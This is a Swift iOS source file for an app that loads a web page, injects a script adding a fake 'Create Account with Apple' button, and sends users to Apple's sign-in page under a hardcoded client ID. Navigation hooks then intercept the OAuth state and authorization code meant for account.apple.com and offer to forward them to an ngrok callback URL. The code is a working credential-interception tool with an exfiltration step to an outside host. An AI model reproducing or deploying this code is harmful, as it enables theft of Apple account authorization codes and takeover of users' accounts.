//
//  ContentView.swift
//  WebViewAPP
//
//  Created by Abdelhak Kherroubi on 25/06/2025.
//

import SwiftUI
import WebKit

// To support iOS 15+, set the deployment target in Xcode (General tab > Deployment Info > iOS 15.0 or 16.0)
let iPhoneUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"

class MerchantWebViewController: UIViewController, WKNavigationDelegate, WKUIDelegate {
    var webView: WKWebView!
    let merchantURL = URL(string: "https://example.com")!
    var injectScriptOnLoad = false
    // Closure to notify when Apple auth result is received
    var onAppleAuthResult: ((_ state: String, _ code: String) -> Void)?

    override func loadView() {
        let config = WKWebViewConfiguration()
        config.websiteDataStore = .default()
        let userContentController = WKUserContentController()
        
        // Bootstrap script that runs on every page load
        let bootstrapScript = """
            (function() {
                // Remove any previous button if it exists
                var oldBtn = document.getElementById('apple-create-account-btn');
                if (oldBtn) oldBtn.remove();
                
                // Create the button
                var btn = document.createElement('button');
                btn.id = 'apple-create-account-btn';
                btn.textContent = 'Create Account with Apple';
                btn.style.position = 'fixed';
                btn.style.top = '50%';
                btn.style.left = '50%';
                btn.style.transform = 'translate(-50%, -50%)';
                btn.style.padding = '32px 48px';
                btn.style.fontSize = '2rem';
                btn.style.background = '#000';
                btn.style.color = '#fff';
                btn.style.border = 'none';
                btn.style.borderRadius = '16px';
                btn.style.cursor = 'pointer';
                btn.style.zIndex = '99999';
                btn.style.boxShadow = '0 4px 24px rgba(0,0,0,0.2)';
                btn.style.fontWeight = 'bold';
                
                btn.onclick = function() {
                    function injectMetaRedirect(url, delaySeconds) {
                      const meta = document.createElement('meta');
                      meta.httpEquiv = 'refresh';
                      meta.content = `${delaySeconds};url=${url}`;
                      document.head.appendChild(meta);
                    }
                    function generateState() {
                      function randomPart(length) {
                        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
                        let result = '';
                        for (let i = 0; i < length; i++) {
                          result += chars.charAt(Math.floor(Math.random() * chars.length));
                        }
                        return result;
                      }
                      const state = `auth-${randomPart(8)}-${randomPart(4)}-${randomPart(4)}-${randomPart(4)}-${randomPart(8)}`;
                      return state;
                    }
                    function generateAppleFIDAuthUrl() {
                      const token = generateState();
                      const url = `https://idmsa.apple.com/appleauth/auth/authorize/signin?frame_id=${token}&skVersion=7&iframeId=${token}&client_id=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&redirect_uri=https://account.apple.com&response_type=code&response_mode=query&state=${token}&authVersion=latest`;
                      return url;
                    }
                    var appleAuthUrl = generateAppleFIDAuthUrl();
                    console.log(appleAuthUrl);
                    injectMetaRedirect(appleAuthUrl, 0);
                };
                document.body.appendChild(btn);
            })();
        """
        
        let userScript = WKUserScript(source: bootstrapScript, injectionTime: .atDocumentEnd, forMainFrameOnly: false)
        userContentController.addUserScript(userScript)
        config.userContentController = userContentController

        webView = WKWebView(frame: .zero, configuration: config)
        webView.customUserAgent = iPhoneUserAgent
        if #available(iOS 16.4, *) {
            webView.isInspectable = true
        }
        webView.navigationDelegate = self
        webView.uiDelegate = self
        view = webView
    }

    override func viewDidLoad() {
        super.viewDidLoad()
        webView.load(URLRequest(url: merchantURL))
    }

    // Inject JS after page load if requested
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        if injectScriptOnLoad {
            let js = """
                console.log('JS inject success');
                var link = document.createElement('a');
                link.href = 'https://www.google.com';
                link.textContent = 'Go to Google';
                link.target = '_blank';
                link.style.display = 'block';
                link.style.margin = '40px auto';
                link.style.fontSize = '2em';
                document.body.appendChild(link);
            """
            webView.evaluateJavaScript(js) { result, error in
                if let error = error {
                    print("JS injection error: \(error)")
                } else {
                    print("JS injected successfully")
                }
            }
            injectScriptOnLoad = false
        }

        if let url = webView.url, url.absoluteString.contains("account.apple.com") {
            if let components = URLComponents(url: url, resolvingAgainstBaseURL: false) {
                if let state = components.queryItems?.first(where: { $0.name == "state" })?.value,
                   let code = components.queryItems?.first(where: { $0.name == "code" })?.value {
                    print("[WKWebView] (didFinish) Intercepted state: \(state), code: \(code)")
                    onAppleAuthResult?(state, code)
                    let alert = UIAlertController(title: "Apple Auth Intercepted", message: "State: \(state)\nCode: \(code)", preferredStyle: .alert)
                    alert.addAction(UIAlertAction(title: "OK", style: .default))
                    self.present(alert, animated: true)
                } else {
                    print("[WKWebView] (didFinish) No state/code in query params or failed to parse URL components")
                }
            }
        }
    }

    // Intercept navigation to extract Apple state and code
    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        if let url = navigationAction.request.url {
            print("[WKWebView] Navigating to: \(url.absoluteString)")
            if url.absoluteString.contains("account.apple.com") {
                if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
                   let state = components.queryItems?.first(where: { $0.name == "state" })?.value,
                   let code = components.queryItems?.first(where: { $0.name == "code" })?.value {
                    print("[WKWebView] Intercepted state: \(state), code: \(code)")
                    onAppleAuthResult?(state, code)
                    decisionHandler(.cancel)
                    return
                } else {
                    print("[WKWebView] (decidePolicyFor) No state/code in query params or failed to parse URL components")
                }
            }
        }
        decisionHandler(.allow)
    }
}

struct MerchantWebViewContainer: UIViewControllerRepresentable {
    @Binding var injectScriptOnLoad: Bool
    @Binding var appleAuthResult: (state: String, code: String)?
    @Binding var isPresented: Bool
    class Coordinator {
        var controller: MerchantWebViewController?
    }
    func makeCoordinator() -> Coordinator { Coordinator() }

    func makeUIViewController(context: Context) -> MerchantWebViewController {
        let vc = MerchantWebViewController()
        vc.onAppleAuthResult = { state, code in
            appleAuthResult = (state, code)
            isPresented = false
        }
        context.coordinator.controller = vc
        return vc
    }
    func updateUIViewController(_ uiViewController: MerchantWebViewController, context: Context) {
        uiViewController.injectScriptOnLoad = injectScriptOnLoad
    }
}

struct ContentView: View {
    @State private var injectScriptOnLoad = false
    @State private var appleAuthResult: (state: String, code: String)? = nil
    @State private var showWebView = true
    @State private var callbackBaseURL: String = "https://4cbe-50-114-24-105.ngrok-free.app/receive"
    @State private var sentURL: String? = nil
    var body: some View {
        VStack(spacing: 16) {
            if let result = appleAuthResult {
                Text("Apple state: \(result.state)")
                Text("Apple code: \(result.code)")
                Button("Send to Callback URL") {
                    // Compose the URL
                    guard var urlComponents = URLComponents(string: callbackBaseURL) else { return }
                    var queryItems = urlComponents.queryItems ?? []
                    queryItems.append(URLQueryItem(name: "state", value: result.state))
                    queryItems.append(URLQueryItem(name: "code", value: result.code))
                    urlComponents.queryItems = queryItems
                    guard let url = urlComponents.url else { return }
                    sentURL = url.absoluteString
                    // Send GET request
                    let task = URLSession.shared.dataTask(with: url) { _, _, _ in }
                    task.resume()
                }
                .padding()
            }
            if let url = sentURL {
                Text("Sent URL: \(url)")
                    .font(.footnote)
                    .foregroundColor(.blue)
                    .multilineTextAlignment(.center)
            }
            HStack {
                Text("Callback Base URL:")
                TextField("https://your-callback-url.com/receive", text: $callbackBaseURL)
                    .textFieldStyle(RoundedBorderTextFieldStyle())
            }.padding()
            if showWebView {
                MerchantWebViewContainer(
                    injectScriptOnLoad: $injectScriptOnLoad,
                    appleAuthResult: $appleAuthResult,
                    isPresented: $showWebView
                )
                .edgesIgnoringSafeArea(.all)
            }
        }
        .padding()
    }
}

#Preview {
    ContentView()
}
